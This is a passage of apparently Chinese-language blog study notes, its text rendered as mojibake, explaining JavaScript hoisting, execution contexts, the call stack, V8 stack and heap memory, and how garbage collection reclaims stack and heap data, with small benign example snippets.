ï¼Œç»è¿‡ç¼–è¯‘åï¼Œä¼šç”Ÿæˆä¸¤éƒ¨åˆ†å†…å®¹ï¼š<strong>æ‰§è¡Œä¸Šä¸‹æ–‡ï¼ˆExecution contextï¼‰å’Œå¯æ‰§è¡Œä»£ç </strong>ã€‚</p><p><strong>æ‰§è¡Œä¸Šä¸‹æ–‡æ˜¯ JavaScript æ‰§è¡Œä¸€æ®µä»£ç æ—¶çš„è¿è¡Œç¯å¢ƒ</strong>ï¼Œæ¯”å¦‚è°ƒç”¨ä¸€ä¸ªå‡½æ•°ï¼Œå°±ä¼šè¿›å…¥è¿™ä¸ªå‡½æ•°çš„æ‰§è¡Œä¸Šä¸‹æ–‡ï¼Œç¡®å®šè¯¥å‡½æ•°åœ¨æ‰§è¡ŒæœŸé—´ç”¨åˆ°çš„è¯¸å¦‚ thisã€å˜é‡ã€å¯¹è±¡ä»¥åŠå‡½æ•°ç­‰ã€‚</p><h3 id="2-æ‰§è¡Œé˜¶æ®µ"><a href="#2-æ‰§è¡Œé˜¶æ®µ" class="headerlink" title="2. æ‰§è¡Œé˜¶æ®µ"></a><strong>2. æ‰§è¡Œé˜¶æ®µ</strong></h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">showName()</span><br><span class="line"><span class="built_in">console</span>.log(myname)</span><br><span class="line"><span class="keyword">var</span> myname = <span class="string">&#x27;æå®¢æ—¶é—´&#x27;</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">showName</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&#x27;å‡½æ•° showName è¢«æ‰§è¡Œ&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><p>å½“æ‰§è¡Œåˆ° showName å‡½æ•°æ—¶ï¼ŒJavaScript å¼•æ“ä¾¿å¼€å§‹åœ¨å˜é‡ç¯å¢ƒå¯¹è±¡ä¸­æŸ¥æ‰¾è¯¥å‡½æ•°ï¼Œç”±äºå˜é‡ç¯å¢ƒå¯¹è±¡ä¸­å­˜åœ¨è¯¥å‡½æ•°çš„å¼•ç”¨ï¼Œæ‰€ä»¥ JavaScript å¼•æ“ä¾¿å¼€å§‹æ‰§è¡Œè¯¥å‡½æ•°ï¼Œå¹¶è¾“å‡ºâ€œå‡½æ•° showName è¢«æ‰§è¡Œâ€ç»“æœã€‚</p></li><li><p>æ¥ä¸‹æ¥æ‰“å°â€œmynameâ€ä¿¡æ¯ï¼ŒJavaScript å¼•æ“ç»§ç»­åœ¨å˜é‡ç¯å¢ƒå¯¹è±¡ä¸­æŸ¥æ‰¾è¯¥å¯¹è±¡ï¼Œç”±äºå˜é‡ç¯å¢ƒå­˜åœ¨ myname å˜é‡ï¼Œå¹¶ä¸”å…¶å€¼ä¸º undefinedï¼Œæ‰€ä»¥è¿™æ—¶å€™å°±è¾“å‡º undefinedã€‚</p></li><li><p>æ¥ä¸‹æ¥æ‰§è¡Œç¬¬ 3 è¡Œï¼ŒæŠŠâ€œæå®¢æ—¶é—´â€èµ‹ç»™ myname å˜é‡ï¼Œèµ‹å€¼åå˜é‡ç¯å¢ƒä¸­çš„ myname å±æ€§å€¼æ”¹å˜ä¸ºâ€œæå®¢æ—¶é—´â€ï¼Œå˜é‡ç¯å¢ƒå¦‚ä¸‹æ‰€ç¤ºï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">VariableEnvironment:</span><br><span class="line">     myname -&gt; &quot; æå®¢æ—¶é—´ &quot;, </span><br><span class="line">     showName -&gt;function : &#123;console.log(myname)</span><br></pre></td></tr></table></figure></li></ul><h2 id="ä»£ç ä¸­å‡ºç°ç›¸åŒçš„å˜é‡æˆ–è€…å‡½æ•°æ€ä¹ˆåŠï¼Ÿ"><a href="#ä»£ç ä¸­å‡ºç°ç›¸åŒçš„å˜é‡æˆ–è€…å‡½æ•°æ€ä¹ˆåŠï¼Ÿ" class="headerlink" title="ä»£ç ä¸­å‡ºç°ç›¸åŒçš„å˜é‡æˆ–è€…å‡½æ•°æ€ä¹ˆåŠï¼Ÿ"></a>ä»£ç ä¸­å‡ºç°ç›¸åŒçš„å˜é‡æˆ–è€…å‡½æ•°æ€ä¹ˆåŠï¼Ÿ</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">showName</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&#x27;æå®¢é‚¦&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">showName();</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">showName</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&#x27;æå®¢æ—¶é—´&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">showName(); </span><br></pre></td></tr></table></figure><ul><li><strong>é¦–å…ˆæ˜¯ç¼–è¯‘é˜¶æ®µ</strong>ã€‚é‡åˆ°äº†ç¬¬ä¸€ä¸ª showName å‡½æ•°ï¼Œä¼šå°†è¯¥å‡½æ•°ä½“å­˜æ”¾åˆ°å˜é‡ç¯å¢ƒä¸­ã€‚æ¥ä¸‹æ¥æ˜¯ç¬¬äºŒä¸ª showName å‡½æ•°ï¼Œç»§ç»­å­˜æ”¾è‡³å˜é‡ç¯å¢ƒä¸­ï¼Œä½†æ˜¯å˜é‡ç¯å¢ƒä¸­å·²ç»å­˜åœ¨ä¸€ä¸ª showName å‡½æ•°äº†ï¼Œæ­¤æ—¶ï¼Œ<strong>ç¬¬äºŒä¸ª showName å‡½æ•°ä¼šå°†ç¬¬ä¸€ä¸ª showName å‡½æ•°è¦†ç›–æ‰</strong>ã€‚è¿™æ ·å˜é‡ç¯å¢ƒä¸­å°±åªå­˜åœ¨ç¬¬äºŒä¸ª showName å‡½æ•°äº†ã€‚</li><li><strong>æ¥ä¸‹æ¥æ˜¯æ‰§è¡Œé˜¶æ®µ</strong>ã€‚å…ˆæ‰§è¡Œç¬¬ä¸€ä¸ª showName å‡½æ•°ï¼Œä½†ç”±äºæ˜¯ä»å˜é‡ç¯å¢ƒä¸­æŸ¥æ‰¾ showName å‡½æ•°ï¼Œè€Œå˜é‡ç¯å¢ƒä¸­åªä¿å­˜äº†ç¬¬äºŒä¸ª showName å‡½æ•°ï¼Œæ‰€ä»¥æœ€ç»ˆè°ƒç”¨çš„æ˜¯ç¬¬äºŒä¸ªå‡½æ•°ï¼Œæ‰“å°çš„å†…å®¹æ˜¯â€œæå®¢æ—¶é—´â€ã€‚ç¬¬äºŒæ¬¡æ‰§è¡Œ showName å‡½æ•°ä¹Ÿæ˜¯èµ°åŒæ ·çš„æµç¨‹ï¼Œæ‰€ä»¥è¾“å‡ºçš„ç»“æœä¹Ÿæ˜¯â€œæå®¢æ—¶é—´â€ã€‚</li></ul><p>ç»¼ä¸Šï¼Œ<strong>ä¸€æ®µä»£ç å¦‚æœå®šä¹‰äº†ä¸¤ä¸ªç›¸åŒåå­—çš„å‡½æ•°ï¼Œé‚£ä¹ˆæœ€ç»ˆç”Ÿæ•ˆçš„æ˜¯æœ€åä¸€ä¸ªå‡½æ•°</strong>ã€‚</p><h2 id="ä¸ºä»€ä¹ˆJavaScriptä»£ç ä¼šå‡ºç°æ ˆæº¢å‡ºï¼Ÿ"><a href="#ä¸ºä»€ä¹ˆJavaScriptä»£ç ä¼šå‡ºç°æ ˆæº¢å‡ºï¼Ÿ" class="headerlink" title="ä¸ºä»€ä¹ˆJavaScriptä»£ç ä¼šå‡ºç°æ ˆæº¢å‡ºï¼Ÿ"></a>ä¸ºä»€ä¹ˆJavaScriptä»£ç ä¼šå‡ºç°æ ˆæº¢å‡ºï¼Ÿ</h2><p>**æ˜ç¡®:**å“ªäº›æƒ…å†µä¸‹ä»£ç æ‰ç®—æ˜¯â€œä¸€æ®µâ€ä»£ç ï¼Œæ‰ä¼šåœ¨æ‰§è¡Œä¹‹å‰å°±è¿›è¡Œç¼–è¯‘å¹¶åˆ›å»ºæ‰§è¡Œä¸Šä¸‹æ–‡ã€‚ä¸€èˆ¬è¯´æ¥ï¼Œæœ‰è¿™ä¹ˆä¸‰ç§æƒ…å†µï¼š</p><ol><li>å½“ JavaScript æ‰§è¡Œå…¨å±€ä»£ç çš„æ—¶å€™ï¼Œä¼šç¼–è¯‘å…¨å±€ä»£ç å¹¶åˆ›å»ºå…¨å±€æ‰§è¡Œä¸Šä¸‹æ–‡ï¼Œè€Œä¸”åœ¨æ•´ä¸ªé¡µé¢çš„ç”Ÿå­˜å‘¨æœŸå†…ï¼Œå…¨å±€æ‰§è¡Œä¸Šä¸‹æ–‡åªæœ‰ä¸€ä»½ã€‚</li><li>å½“è°ƒç”¨ä¸€ä¸ªå‡½æ•°çš„æ—¶å€™ï¼Œå‡½æ•°ä½“å†…çš„ä»£ç ä¼šè¢«ç¼–è¯‘ï¼Œå¹¶åˆ›å»ºå‡½æ•°æ‰§è¡Œä¸Šä¸‹æ–‡ï¼Œä¸€èˆ¬æƒ…å†µä¸‹ï¼Œå‡½æ•°æ‰§è¡Œç»“æŸä¹‹åï¼Œåˆ›å»ºçš„å‡½æ•°æ‰§è¡Œä¸Šä¸‹æ–‡ä¼šè¢«é”€æ¯ã€‚</li><li>å½“ä½¿ç”¨ eval å‡½æ•°çš„æ—¶å€™ï¼Œeval çš„ä»£ç ä¹Ÿä¼šè¢«ç¼–è¯‘ï¼Œå¹¶åˆ›å»ºæ‰§è¡Œä¸Šä¸‹æ–‡ã€‚</li></ol><p>JavaScript ä¸­æœ‰å¾ˆå¤šå‡½æ•°ï¼Œç»å¸¸ä¼šå‡ºç°åœ¨ä¸€ä¸ªå‡½æ•°ä¸­è°ƒç”¨å¦å¤–ä¸€ä¸ªå‡½æ•°çš„æƒ…å†µï¼Œ<strong>è°ƒç”¨æ ˆå°±æ˜¯ç”¨æ¥ç®¡ç†å‡½æ•°è°ƒç”¨å…³ç³»çš„ä¸€ç§æ•°æ®ç»“æ„</strong>ã€‚</p><h3 id="ä»€ä¹ˆæ˜¯å‡½æ•°è°ƒç”¨"><a href="#ä»€ä¹ˆæ˜¯å‡½æ•°è°ƒç”¨" class="headerlink" title="ä»€ä¹ˆæ˜¯å‡½æ•°è°ƒç”¨"></a>ä»€ä¹ˆæ˜¯å‡½æ•°è°ƒç”¨</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> a = <span class="number">2</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">add</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">var</span> b = <span class="number">10</span></span><br><span class="line"><span class="keyword">return</span>  a+b</span><br><span class="line">&#125;</span><br><span class="line">add()</span><br></pre></td></tr></table></figure><p>å†³å®šæš‚æ—¶ä¸æ•´ç†è¿™ä¸€å—çš„ç¬”è®°ï¼Œä¸»è¦è¿˜æ˜¯æµè§ˆå™¨çš„çŸ¥è¯†å§ã€‚ï¼ˆå› ä¸ºæ„Ÿè§‰åƒæŠŠè€å¸ˆè¯´çš„éƒ½å¤åˆ¶äº†ä¸€è¾¹= ï¼‰</p><hr><h1 id="V8å·¥ä½œåŸç†"><a href="#V8å·¥ä½œåŸç†" class="headerlink" title="V8å·¥ä½œåŸç†"></a>V8å·¥ä½œåŸç†</h1><p>è¿™é‡Œä¸»è¦ä»‹ç»<strong>JavaScript çš„å†…å­˜æœºåˆ¶ã€‚</strong></p><h2 id="æ•°æ®åœ¨å†…å­˜ä¸­çš„å­˜æ”¾"><a href="#æ•°æ®åœ¨å†…å­˜ä¸­çš„å­˜æ”¾" class="headerlink" title="æ•°æ®åœ¨å†…å­˜ä¸­çš„å­˜æ”¾"></a>æ•°æ®åœ¨å†…å­˜ä¸­çš„å­˜æ”¾</h2><h3 id="JavaScript-çš„è¯­è¨€ç±»å‹"><a href="#JavaScript-çš„è¯­è¨€ç±»å‹" class="headerlink" title="JavaScript çš„è¯­è¨€ç±»å‹"></a>JavaScript çš„è¯­è¨€ç±»å‹</h3><p>JavaScript æ˜¯<strong>åŠ¨æ€è¯­è¨€</strong>ï¼Œå› ä¸ºåœ¨å£°æ˜å˜é‡ä¹‹å‰å¹¶ä¸éœ€è¦ç¡®è®¤å…¶æ•°æ®ç±»å‹ï¼›ä¹Ÿæ˜¯<strong>å¼±ç±»å‹è¯­è¨€</strong>ï¼Œå› ä¸ºå®ƒæ”¯æŒéšå¼ç±»å‹è½¬æ¢ã€‚<strong>ï¼ˆåŠ¨æ€å¼±ç±»å‹ï¼‰</strong></p><h3 id="JavaScript-çš„æ•°æ®ç±»å‹"><a href="#JavaScript-çš„æ•°æ®ç±»å‹" class="headerlink" title="JavaScript çš„æ•°æ®ç±»å‹"></a>JavaScript çš„æ•°æ®ç±»å‹</h3><p>JavaScript ä¸­çš„æ•°æ®ç±»å‹ä¸€ç§æœ‰ 8 ç§ï¼Œå®ƒä»¬åˆ†åˆ«æ˜¯ï¼š</p><p><img src="https://i.loli.net/2021/06/14/Lx2RKzPS3FybiaH.jpg" alt="Snipaste_2021-06-14_15-44-28.jpg"></p><p>æœ‰ä¸‰ç‚¹éœ€è¦æ³¨æ„ï¼š</p><p>ç¬¬ä¸€ç‚¹ï¼Œä½¿ç”¨ typeof æ£€æµ‹ Null ç±»å‹æ—¶ï¼Œè¿”å›çš„æ˜¯ Objectã€‚è¿™æ˜¯å½“åˆ JavaScript è¯­è¨€çš„ä¸€ä¸ª Bugï¼Œä¸€ç›´ä¿ç•™è‡³ä»Šï¼Œä¹‹æ‰€ä»¥ä¸€ç›´æ²¡ä¿®æ”¹è¿‡æ¥ï¼Œä¸»è¦æ˜¯ä¸ºäº†å…¼å®¹è€çš„ä»£ç ã€‚</p><p>ç¬¬äºŒç‚¹ï¼ŒObject ç±»å‹æ¯”è¾ƒç‰¹æ®Šï¼Œå®ƒæ˜¯ç”±ä¸Šè¿° 7 ç§ç±»å‹ç»„æˆçš„ä¸€ä¸ªåŒ…å«äº† key-value å¯¹çš„æ•°æ®ç±»å‹ã€‚å¦‚ä¸‹æ‰€ç¤ºï¼š</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> myObj = &#123;</span><br><span class="line">    <span class="attr">name</span>:<span class="string">&#x27;æå®¢æ—¶é—´&#x27;</span>,</span><br><span class="line">    <span class="attr">update</span>:<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;....&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å…¶ä¸­ vaule å¯ä»¥æ˜¯ä»»ä½•ç±»å‹ï¼ŒåŒ…æ‹¬å‡½æ•°ï¼Œè¿™ä¹Ÿå°±æ„å‘³ç€å¯ä»¥é€šè¿‡ Object æ¥å­˜å‚¨å‡½æ•°ï¼ŒObject ä¸­çš„å‡½æ•°åˆç§°ä¸ºæ–¹æ³•</p><p>ç¬¬ä¸‰ç‚¹ï¼Œæˆ‘ä»¬æŠŠå‰é¢çš„ 7 ç§æ•°æ®ç±»å‹ç§°ä¸º<strong>åŸå§‹ç±»å‹</strong>ï¼ŒæŠŠæœ€åä¸€ä¸ªå¯¹è±¡ç±»å‹ç§°ä¸º<strong>å¼•ç”¨ç±»å‹</strong></p><h3 id="å†…å­˜ç©ºé—´"><a href="#å†…å­˜ç©ºé—´" class="headerlink" title="å†…å­˜ç©ºé—´"></a>å†…å­˜ç©ºé—´</h3><p><img src="https://i.loli.net/2021/06/14/cUdWrQKFxCw6jn7.jpg" alt="Snipaste_2021-06-14_15-46-52.jpg"></p><p>åœ¨ JavaScript çš„æ‰§è¡Œè¿‡ç¨‹ä¸­ï¼Œ ä¸»è¦æœ‰ä¸‰ç§ç±»å‹å†…å­˜ç©ºé—´ï¼Œåˆ†åˆ«æ˜¯<strong>ä»£ç ç©ºé—´ã€æ ˆç©ºé—´</strong>å’Œ<strong>å †ç©ºé—´</strong>ã€‚</p><p>å‚è€ƒå¦‚ä¸‹ä»£ç æ®µï¼š</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> a = <span class="string">&quot; æå®¢æ—¶é—´ &quot;</span></span><br><span class="line">    <span class="keyword">var</span> b = a</span><br><span class="line">    <span class="keyword">var</span> c = &#123;<span class="attr">name</span>:<span class="string">&quot; æå®¢æ—¶é—´ &quot;</span>&#125;</span><br><span class="line">    <span class="keyword">var</span> d = c</span><br><span class="line">&#125;</span><br><span class="line">foo()</span><br></pre></td></tr></table></figure><p>å½“æ‰§è¡Œä¸€æ®µä»£ç æ—¶ï¼Œéœ€è¦å…ˆç¼–è¯‘ï¼Œå¹¶åˆ›å»ºæ‰§è¡Œä¸Šä¸‹æ–‡ï¼Œç„¶åå†æŒ‰ç…§é¡ºåºæ‰§è¡Œä»£ç ã€‚å½“æ‰§è¡Œåˆ°ç¬¬ 3 è¡Œæ—¶ï¼Œå˜é‡ a å’Œå˜é‡ b çš„å€¼éƒ½è¢«ä¿å­˜åœ¨æ‰§è¡Œä¸Šä¸‹æ–‡ä¸­ï¼Œè€Œæ‰§è¡Œä¸Šä¸‹æ–‡åˆè¢«å‹å…¥åˆ°æ ˆä¸­ï¼Œæ‰€ä»¥ä¹Ÿå¯ä»¥è®¤ä¸ºå˜é‡ a å’Œå˜é‡ b çš„å€¼éƒ½æ˜¯å­˜æ”¾åœ¨æ ˆä¸­çš„ã€‚æ‰§è¡Œç¬¬ 4 è¡Œä»£ç ï¼Œç”±äº JavaScript å¼•æ“åˆ¤æ–­å³è¾¹çš„å€¼æ˜¯ä¸€ä¸ªå¼•ç”¨ç±»å‹ï¼Œè¿™æ—¶å€™JavaScript å¼•æ“ä¼šå°†å®ƒåˆ†é…åˆ°å †ç©ºé—´é‡Œé¢ï¼Œåˆ†é…åè¯¥å¯¹è±¡ä¼šæœ‰ä¸€ä¸ªåœ¨â€œå †â€ä¸­çš„åœ°å€ï¼Œç„¶åå†å°†è¯¥æ•°æ®çš„åœ°å€å†™è¿› c çš„å˜é‡å€¼ï¼Œæœ€ç»ˆåˆ†é…å¥½å†…å­˜çš„ç¤ºæ„å›¾å¦‚ä¸‹æ‰€ç¤ºï¼š</p><p><img src="https://i.loli.net/2021/06/14/k3yoZitJHrPqD45.jpg" alt="Snipaste_2021-06-14_15-52-29.jpg"></p><p>å› æ­¤ï¼Œ<strong>å¯¹è±¡ç±»å‹</strong>æ˜¯å­˜æ”¾åœ¨<strong>å †ç©ºé—´</strong>çš„ï¼Œåœ¨æ ˆç©ºé—´ä¸­åªæ˜¯ä¿ç•™äº†<strong>å¯¹è±¡çš„å¼•ç”¨åœ°å€</strong>ï¼Œå½“ JavaScript éœ€è¦è®¿é—®è¯¥æ•°æ®çš„æ—¶å€™ï¼Œé€šè¿‡æ ˆä¸­çš„å¼•ç”¨åœ°å€æ¥è®¿é—®ã€‚å³ï¼š<strong>åŸå§‹ç±»å‹çš„æ•°æ®å€¼éƒ½æ˜¯ç›´æ¥ä¿å­˜åœ¨â€œæ ˆâ€ä¸­çš„ï¼Œå¼•ç”¨ç±»å‹çš„å€¼æ˜¯å­˜æ”¾åœ¨â€œå †â€ä¸­çš„ã€‚</strong></p><blockquote><p>ä¸ºä»€ä¹ˆä¸€å®šè¦åˆ†â€œå †â€å’Œâ€œæ ˆâ€ä¸¤ä¸ªå­˜å‚¨ç©ºé—´ï¼Ÿ</p></blockquote><p>å› ä¸º JavaScript å¼•æ“éœ€è¦ç”¨æ ˆæ¥ç»´æŠ¤ç¨‹åºæ‰§è¡ŒæœŸé—´ä¸Šä¸‹æ–‡çš„çŠ¶æ€ï¼Œå¦‚æœæ ˆç©ºé—´å¤§äº†è¯ï¼Œæ‰€æœ‰çš„æ•°æ®éƒ½å­˜æ”¾åœ¨æ ˆç©ºé—´é‡Œé¢ï¼Œé‚£ä¹ˆä¼šå½±å“åˆ°ä¸Šä¸‹æ–‡åˆ‡æ¢çš„æ•ˆç‡ï¼Œè¿›è€Œåˆå½±å“åˆ°æ•´ä¸ªç¨‹åºçš„æ‰§è¡Œæ•ˆç‡ã€‚æ¯”å¦‚æ–‡ä¸­çš„ foo å‡½æ•°æ‰§è¡Œç»“æŸäº†ï¼ŒJavaScript å¼•æ“éœ€è¦ç¦»å¼€å½“å‰çš„æ‰§è¡Œä¸Šä¸‹æ–‡ï¼Œåªéœ€è¦å°†æŒ‡é’ˆä¸‹ç§»åˆ°ä¸Šä¸ªæ‰§è¡Œä¸Šä¸‹æ–‡çš„åœ°å€å°±å¯ä»¥äº†ï¼Œfoo å‡½æ•°æ‰§è¡Œä¸Šä¸‹æ–‡æ ˆåŒºç©ºé—´å…¨éƒ¨å›æ”¶ï¼Œå…·ä½“è¿‡ç¨‹å¯ä»¥å‚è€ƒä¸‹å›¾ï¼š</p><p><img src="https://i.loli.net/2021/06/14/gfdXi2vJHput3xo.jpg" alt="Snipaste_2021-06-14_15-54-55.jpg"></p><p><strong>é€šå¸¸æƒ…å†µä¸‹ï¼Œæ ˆç©ºé—´éƒ½ä¸ä¼šè®¾ç½®å¤ªå¤§ï¼Œä¸»è¦ç”¨æ¥å­˜æ”¾ä¸€äº›åŸå§‹ç±»å‹çš„å°æ•°æ®</strong>ã€‚è€Œå¼•ç”¨ç±»å‹çš„æ•°æ®å ç”¨çš„ç©ºé—´éƒ½æ¯”è¾ƒå¤§ï¼Œæ‰€ä»¥è¿™ä¸€ç±»æ•°æ®ä¼šè¢«å­˜æ”¾åˆ°å †ä¸­ï¼Œ<strong>å †ç©ºé—´å¾ˆå¤§ï¼Œèƒ½å­˜æ”¾å¾ˆå¤šå¤§çš„æ•°æ®</strong>ï¼Œä¸è¿‡ç¼ºç‚¹æ˜¯åˆ†é…å†…å­˜å’Œå›æ”¶å†…å­˜éƒ½ä¼šå ç”¨ä¸€å®šçš„æ—¶é—´ã€‚</p><p>åœ¨ JavaScript ä¸­ï¼Œèµ‹å€¼æ“ä½œå’Œå…¶ä»–è¯­è¨€æœ‰å¾ˆå¤§çš„ä¸åŒï¼Œ<strong>åŸå§‹ç±»å‹çš„èµ‹å€¼ä¼šå®Œæ•´å¤åˆ¶å˜é‡å€¼ï¼Œè€Œå¼•ç”¨ç±»å‹çš„èµ‹å€¼æ˜¯å¤åˆ¶å¼•ç”¨åœ°å€</strong>ã€‚æ‰€ä»¥<code>d=c</code>çš„æ“ä½œå°±æ˜¯æŠŠ c çš„å¼•ç”¨åœ°å€èµ‹å€¼ç»™ dã€‚</p><h2 id="JavaScript-å¤„ç†åƒåœ¾å›æ”¶"><a href="#JavaScript-å¤„ç†åƒåœ¾å›æ”¶" class="headerlink" title="JavaScript å¤„ç†åƒåœ¾å›æ”¶"></a>JavaScript å¤„ç†åƒåœ¾å›æ”¶</h2><p>é€šå¸¸æƒ…å†µä¸‹ï¼Œåƒåœ¾æ•°æ®å›æ”¶åˆ†ä¸º<strong>æ‰‹åŠ¨å›æ”¶</strong>å’Œ<strong>è‡ªåŠ¨å›æ”¶</strong>ä¸¤ç§ç­–ç•¥ã€‚åœ¨JavaScriptä¸­ <strong>äº§ç”Ÿçš„åƒåœ¾æ•°æ®æ˜¯ç”±åƒåœ¾å›æ”¶å™¨æ¥é‡Šæ”¾çš„ã€‚</strong></p><h3 id="è°ƒç”¨æ ˆä¸­çš„æ•°æ®æ˜¯å¦‚ä½•å›æ”¶çš„"><a href="#è°ƒç”¨æ ˆä¸­çš„æ•°æ®æ˜¯å¦‚ä½•å›æ”¶çš„" class="headerlink" title="è°ƒç”¨æ ˆä¸­çš„æ•°æ®æ˜¯å¦‚ä½•å›æ”¶çš„"></a>è°ƒç”¨æ ˆä¸­çš„æ•°æ®æ˜¯å¦‚ä½•å›æ”¶çš„</h3><p>é¦–å…ˆæ˜¯è°ƒç”¨æ ˆä¸­çš„æ•°æ®ï¼Œè¿˜æ˜¯é€šè¿‡ä¸€æ®µç¤ºä¾‹ä»£ç çš„æ‰§è¡Œæµç¨‹æ¥åˆ†æå…¶å›æ”¶æœºåˆ¶ï¼Œå…·ä½“å¦‚ä¸‹ï¼š</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> a = <span class="number">1</span></span><br><span class="line">    <span class="keyword">var</span> b = &#123;<span class="attr">name</span>:<span class="string">&quot; æå®¢é‚¦ &quot;</span>&#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">showName</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">      <span class="keyword">var</span> c = <span class="string">&quot; æå®¢æ—¶é—´ &quot;</span></span><br><span class="line">      <span class="keyword">var</span> d = &#123;<span class="attr">name</span>:<span class="string">&quot; æå®¢æ—¶é—´ &quot;</span>&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    showName()</span><br><span class="line">&#125;</span><br><span class="line">foo()</span><br></pre></td></tr></table></figure><p>å½“æ‰§è¡Œåˆ°ç¬¬ 6 è¡Œä»£ç æ—¶ï¼Œå…¶è°ƒç”¨æ ˆå’Œå †ç©ºé—´çŠ¶æ€å›¾å¦‚ä¸‹æ‰€ç¤ºï¼š</p><p><img src="https://i.loli.net/2021/06/14/D9F3peN68g5PG7C.jpg" alt="Snipaste_2021-06-14_15-58-51.jpg"></p><p>å¦‚æœæ‰§è¡Œåˆ° showName å‡½æ•°æ—¶ï¼Œé‚£ä¹ˆ JavaScript å¼•æ“ä¼šåˆ›å»º showName å‡½æ•°çš„æ‰§è¡Œä¸Šä¸‹æ–‡ï¼Œå¹¶å°† showName å‡½æ•°çš„æ‰§è¡Œä¸Šä¸‹æ–‡å‹å…¥åˆ°è°ƒç”¨æ ˆä¸­ï¼Œæœ€ç»ˆæ‰§è¡Œåˆ° showName å‡½æ•°æ—¶ï¼Œå…¶è°ƒç”¨æ ˆå°±å¦‚ä¸Šå›¾æ‰€ç¤ºã€‚ä¸æ­¤åŒæ—¶ï¼Œè¿˜æœ‰ä¸€ä¸ª<strong>è®°å½•å½“å‰æ‰§è¡ŒçŠ¶æ€çš„æŒ‡é’ˆï¼ˆç§°ä¸º ESPï¼‰</strong>ï¼ŒæŒ‡å‘è°ƒç”¨æ ˆä¸­ showName å‡½æ•°çš„æ‰§è¡Œä¸Šä¸‹æ–‡ï¼Œè¡¨ç¤ºå½“å‰æ­£åœ¨æ‰§è¡Œ showName å‡½æ•°ã€‚</p><p>æ¥ç€ï¼Œå½“ showName å‡½æ•°æ‰§è¡Œå®Œæˆä¹‹åï¼Œå‡½æ•°æ‰§è¡Œæµç¨‹å°±è¿›å…¥äº† foo å‡½æ•°ï¼Œé‚£è¿™æ—¶å°±éœ€è¦é”€æ¯ showName å‡½æ•°çš„æ‰§è¡Œä¸Šä¸‹æ–‡ã€‚JavaScript ä¼šå°† ESP ä¸‹ç§»åˆ° foo å‡½æ•°çš„æ‰§è¡Œä¸Šä¸‹æ–‡ï¼Œ<strong>è¿™ä¸ªä¸‹ç§»æ“ä½œå°±æ˜¯é”€æ¯ showName å‡½æ•°æ‰§è¡Œä¸Šä¸‹æ–‡çš„è¿‡ç¨‹</strong>ã€‚</p><p><img src="https://i.loli.net/2021/06/14/QAW1ZmTXOSxEvMc.jpg" alt="Snipaste_2021-06-14_16-01-56.jpg"></p><p>ä»å›¾ä¸­å¯ä»¥çœ‹å‡ºï¼Œå½“ showName å‡½æ•°æ‰§è¡Œç»“æŸä¹‹åï¼ŒESP å‘ä¸‹ç§»åŠ¨åˆ° foo å‡½æ•°çš„æ‰§è¡Œä¸Šä¸‹æ–‡ä¸­ï¼Œä¸Šé¢ showName çš„æ‰§è¡Œä¸Šä¸‹æ–‡è™½ç„¶ä¿å­˜åœ¨æ ˆå†…å­˜ä¸­ï¼Œä½†æ˜¯å·²ç»æ˜¯æ— æ•ˆå†…å­˜äº†ã€‚æ¯”å¦‚å½“ foo å‡½æ•°å†æ¬¡è°ƒç”¨å¦å¤–ä¸€ä¸ªå‡½æ•°æ—¶ï¼Œè¿™å—å†…å®¹ä¼šè¢«ç›´æ¥è¦†ç›–æ‰ï¼Œç”¨æ¥å­˜æ”¾å¦å¤–ä¸€ä¸ªå‡½æ•°çš„æ‰§è¡Œä¸Šä¸‹æ–‡ã€‚</p><h3 id="å †ä¸­çš„æ•°æ®æ˜¯å¦‚ä½•å›æ”¶çš„"><a href="#å †ä¸­çš„æ•°æ®æ˜¯å¦‚ä½•å›æ”¶çš„" class="headerlink" title="å †ä¸­çš„æ•°æ®æ˜¯å¦‚ä½•å›æ”¶çš„"></a>å †ä¸­çš„æ•°æ®æ˜¯å¦‚ä½•å›æ”¶çš„</h3><p>å½“ä¸Šé¢é‚£æ®µä»£ç çš„ foo å‡½æ•°æ‰§è¡Œç»“æŸä¹‹åï¼ŒESP æŒ‡å‘å…¨å±€æ‰§è¡Œä¸Šä¸‹æ–‡ã€‚ä¸è¿‡ä¿å­˜åœ¨å †ä¸­çš„ä¸¤ä¸ªå¯¹è±¡ä¾ç„¶å ç”¨ç€ç©ºé—´ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p><p><img src="https://i.loli.net/2021/06/14/l4CMFg9DnWY6Vv3.jpg" alt="Snipaste_2021-06-14_16-03-41.jpg"></p><p><strong>è¦å›æ”¶å †ä¸­çš„åƒåœ¾æ•°æ®ï¼Œå°±éœ€è¦ç”¨åˆ° JavaScript ä¸­çš„åƒåœ¾å›æ”¶å™¨äº†</strong>ã€‚</p><h4 